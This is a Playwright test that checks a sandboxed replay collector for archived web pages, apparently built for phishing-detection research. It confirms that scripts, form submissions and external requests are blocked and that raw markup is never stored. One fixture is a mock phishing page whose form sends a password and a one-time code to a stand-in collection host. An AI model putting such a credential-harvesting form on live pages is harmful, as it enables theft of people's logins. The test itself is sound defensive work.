import { test, expect } from '@playwright/test';
import { createHash } from 'node:crypto';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';

function sha(path: string): string {
  return createHash('sha256').update(readFileSync(path)).digest('hex');
}

test('safe archived HTML replay produces privacy-safe browser episodes with no external network dependency', async () => {
  const root = mkdtempSync(join(tmpdir(), 'capstone-archive-replay-test-'));
  const archive = join(root, 'archive');
  mkdirSync(archive, { recursive: true });

  const legitimate = join(archive, 'legitimate.html');
  const phishing = join(archive, 'phishing.html');

  writeFileSync(legitimate, `
    <!doctype html>
    <html><body>
      <form action="/login" method="post">
        <input type="password" autocomplete="current-password">
      </form>
      <script>fetch('https://should-never-run.example/')</script>
      <img src="https://should-never-load.example/image.png">
    </body></html>
  `, 'utf8');

  writeFileSync(phishing, `
    <!doctype html>
    <html><body>
      <form action="https://receiver.example/collect" method="post">
        <input type="password">
        <input name="otp" autocomplete="one-time-code">
      </form>
      <iframe src="https://should-never-frame.example/"></iframe>
    </body></html>
  `, 'utf8');

  const plan = {
    schema_version: 'stage-b-archive-replay-plan-1',
    plan_id: 'browser-archive-replay-test',
    created_at: '2026-09-25T00:00:00Z',
    dataset: {
      dataset_id: 'browser-archive-test',
      provider: 'Controlled Test Archive',
      source_reference: 'local-test-fixture',
      source_snapshot_sha256: 'a'.repeat(64),
      independence_group: 'browser-archive-test-source',
      license_reference: 'test-only',
      research_use_allowed: true,
    },
    items: [
      {
        sample_id: 'archive-legitimate',
        html_path: 'legitimate.html',
        ground_truth: 0,
        observed_at: '2026-01-01T00:00:00Z',
        artifact_sha256: sha(legitimate),
        domain_group: 'legitimate.example',
        brand_group: 'legitimate-brand',
        source_group: 'browser-archive-test-source',
        wait_ms: 500,
      },
      {
        sample_id: 'archive-phishing',
        html_path: 'phishing.html',
        ground_truth: 1,
        observed_at: '2026-02-01T00:00:00Z',
        artifact_sha256: sha(phishing),
        domain_group: 'phishing.example',
        brand_group: 'target-brand',
        source_group: 'browser-archive-test-source',
        wait_ms: 500,
      },
    ],
  };

  const planPath = join(root, 'plan.json');
  const outputPath = join(root, 'episodes.json');
  writeFileSync(planPath, JSON.stringify(plan, null, 2), 'utf8');

  const result = spawnSync(
    'node',
    [
      'scripts/stage-b-collect-archive-replay.mjs',
      '--plan', planPath,
      '--archive-root', archive,
      '--output', outputPath,
      '--dist', resolve('dist'),
    ],
    {
      cwd: process.cwd(),
      encoding: 'utf8',
      windowsHide: true,
      timeout: 60_000,
    },
  );

  try {
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    const output = JSON.parse(readFileSync(outputPath, 'utf8'));
    expect(output.schema_version).toBe('stage-b-event-episodes-1');
    expect(output.collector_version).toBe('stage-b-archive-replay-1');
    expect(output.failures).toEqual([]);
    expect(output.episodes).toHaveLength(2);
    expect(output.safety_policy).toMatchObject({
      archived_local_files_only: true,
      replay_origin_loopback_only: true,
      page_scripts_disabled_by_csp: true,
      form_submission_disabled_by_csp: true,
      external_network_requests_aborted: true,
      raw_html_persisted_in_episode_output: false,
      target_urls_persisted: false,
    });

    const isLoopbackOrigin = (value: unknown): boolean => {
      if (typeof value !== 'string' || !value) return true;
      try {
        const parsed = new URL(value);
        return ['127.0.0.1', 'localhost', '::1'].includes(parsed.hostname);
      } catch {
        return false;
      }
    };

    for (const episode of output.episodes) {
      expect(episode.collection_provenance).toBe('ARCHIVED_BROWSER_REPLAY');
      expect(episode.events.length).toBeGreaterThan(0);

      // A blocked iframe can still produce NAVIGATION_STARTED metadata before
      // CSP cancels it. The actual safety boundary is that an external request
      // is never observed and an external navigation is never committed.
      const networkRequests = episode.events.filter(
        (event: any) => event.event_type === 'REQUEST_OBSERVED',
      );
      for (const event of networkRequests) {
        expect(isLoopbackOrigin(event.destination_origin)).toBe(true);
        expect(isLoopbackOrigin(event.frame_origin)).toBe(true);
      }

      const committedNavigations = episode.events.filter(
        (event: any) => event.event_type === 'NAVIGATION_COMMITTED',
      );
      for (const event of committedNavigations) {
        expect(isLoopbackOrigin(event.destination_origin)).toBe(true);
        expect(isLoopbackOrigin(event.frame_origin)).toBe(true);
      }

      // Raw archive markup is never copied into the episode artifact.
      expect(JSON.stringify(episode)).not.toContain('<form');
      expect(JSON.stringify(episode)).not.toContain('<iframe');
      expect(JSON.stringify(episode)).not.toContain('<script');
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
